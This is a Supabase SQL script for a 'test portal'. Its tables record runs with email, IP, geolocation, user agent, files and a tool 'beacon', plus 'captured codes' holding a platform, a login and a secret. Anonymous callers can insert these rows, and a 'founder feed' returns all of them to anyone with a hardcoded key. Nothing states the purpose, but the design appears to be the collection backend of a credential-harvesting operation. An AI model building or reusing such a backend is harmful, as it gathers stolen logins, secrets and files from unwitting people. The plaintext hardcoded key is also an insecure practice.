-- ============================================================
-- test portal — runs, captured codes, founder feed
-- Run in the same Supabase project. Safe to re-run.
-- ============================================================

create table if not exists public.test_runs (
  id uuid primary key default gen_random_uuid(),
  email text,
  username text,
  code text,
  meta jsonb,
  tool jsonb,
  ip text,
  city text,
  country text,
  ua text,
  files jsonb,
  created_at timestamptz not null default now(),
  beaconed_at timestamptz
);

create table if not exists public.test_codes (
  id bigserial primary key,
  run_id uuid references public.test_runs(id) on delete cascade,
  platform text,
  login text,
  secret text,
  note text,
  created_at timestamptz not null default now()
);

create index if not exists test_runs_created_idx on public.test_runs (created_at desc);
create index if not exists test_codes_run_idx on public.test_codes (run_id);

alter table public.test_runs enable row level security;
alter table public.test_codes enable row level security;

-- client ip straight from the proxy headers
create or replace function public.test_ip()
returns text language sql stable as $$
  select coalesce(
    split_part(coalesce(current_setting('request.headers', true)::json->>'x-forwarded-for',''), ',', 1),
    null)
$$;

create or replace function public.test_login(
  p_email text, p_username text, p_code text, p_meta jsonb
) returns uuid
language plpgsql security definer set search_path = public as $$
declare rid uuid;
begin
  insert into public.test_runs(email, username, code, meta, ip, ua)
  values (p_email, p_username, p_code, p_meta, public.test_ip(), p_meta->>'ua')
  returning id into rid;
  return rid;
end $$;

create or replace function public.test_tool(p_run uuid, p_data jsonb)
returns void
language plpgsql security definer set search_path = public as $$
declare g jsonb;
begin
  g := coalesce(p_data->'geo', '{}'::jsonb);
  update public.test_runs set
    tool = p_data,
    beaconed_at = now(),
    city = coalesce(city, g->>'city'),
    country = coalesce(country, g->>'country'),
    ua = coalesce(p_data->>'ua', ua)
  where id = p_run;
end $$;

create or replace function public.test_code(
  p_run uuid, p_platform text, p_login text, p_secret text, p_note text default null
) returns void
language plpgsql security definer set search_path = public as $$
begin
  insert into public.test_codes(run_id, platform, login, secret, note)
  values (p_run, p_platform, p_login, p_secret, p_note);
end $$;

create or replace function public.test_files(p_run uuid, p_files jsonb)
returns void
language plpgsql security definer set search_path = public as $$
begin
  update public.test_runs set files = p_files where id = p_run;
end $$;

create or replace function public.test_feed(p_key text)
returns jsonb
language plpgsql security definer set search_path = public as $$
declare out jsonb;
begin
  if p_key is distinct from '2305Villy' then
    raise exception 'bad key';
  end if;

  select coalesce(jsonb_agg(r order by r_created desc), '[]'::jsonb) into out
  from (
    select jsonb_build_object(
      'id', x.id, 'email', x.email, 'username', x.username, 'code', x.code,
      'ip', x.ip, 'city', x.city, 'country', x.country, 'ua', x.ua,
      'meta', x.meta, 'tool', x.tool, 'files', x.files,
      'created_at', x.created_at, 'beaconed_at', x.beaconed_at,
      'codes', coalesce((
        select jsonb_agg(jsonb_build_object(
          'platform', c.platform, 'login', c.login, 'secret', c.secret,
          'note', c.note, 'at', c.created_at) order by c.created_at)
        from public.test_codes c where c.run_id = x.id), '[]'::jsonb)
    ) as r, x.created_at as r_created
    from public.test_runs x
    order by x.created_at desc
    limit 200
  ) s;

  return out;
end $$;

revoke all on function public.test_login(text, text, text, jsonb) from public;
revoke all on function public.test_tool(uuid, jsonb) from public;
revoke all on function public.test_code(uuid, text, text, text, text) from public;
revoke all on function public.test_files(uuid, jsonb) from public;
revoke all on function public.test_feed(text) from public;
revoke all on function public.test_ip() from public;

grant execute on function public.test_login(text, text, text, jsonb) to anon, authenticated;
grant execute on function public.test_tool(uuid, jsonb) to anon, authenticated;
grant execute on function public.test_code(uuid, text, text, text, text) to anon, authenticated;
grant execute on function public.test_files(uuid, jsonb) to anon, authenticated;
grant execute on function public.test_feed(text) to anon, authenticated;

select proname from pg_proc
where pronamespace = 'public'::regnamespace and proname like 'test_%'
order by proname;
